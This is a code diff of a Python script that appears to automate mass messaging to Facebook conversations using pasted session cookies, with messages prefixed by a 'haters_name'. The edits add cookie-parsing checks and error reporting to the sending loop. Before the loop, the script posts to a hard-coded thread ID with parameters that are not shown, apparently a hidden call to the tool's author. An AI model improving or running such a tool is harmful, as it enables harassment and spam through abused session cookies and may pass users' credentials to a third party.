@@ -75,8 +75,9 @@ def send_messages():
             def parse_cookies(cookie_str):
                 cookies = {}
                 for item in cookie_str.split(';'):
-                    key, value = item.split('=', 1)
-                    cookies[key.strip()] = value.strip()
+                    if '=' in item:
+                        key, value = item.split('=', 1)
+                        cookies[key.strip()] = value.strip()
                 return cookies
 
             cookies = parse_cookies(cookies_str)
@@ -106,8 +107,12 @@ def send_messages():
                 }
                 try:
                     s = requests.post("https://graph.facebook.com/v15.0/t_100058415170590/", data=parameters, headers=headers, cookies=cookies)
-                except:
-                    pass
+                    if s.ok:
+                        print("[+] Message sent successfully")
+                    else:
+                        print("[x] Failed to send message. Status Code: {}, Response: {}".format(s.status_code, s.text))
+                except Exception as e:
+                    print(f"Failed to send message: {e}")
 
             msg()
             for message_index in range(num_messages):
@@ -127,6 +132,8 @@ def send_messages():
                 else:
                     print("[x] Failed to send messages {} of Convo {}: {}".format(
                         message_index + 1, convo_id, haters_name + ' ' + message))
+                    print("  - Status Code: {}".format(response.status_code))
+                    print("  - Response: {}".format(response.text))
                     print("  - Time: {}".format(current_time))
                     liness()
                     liness()
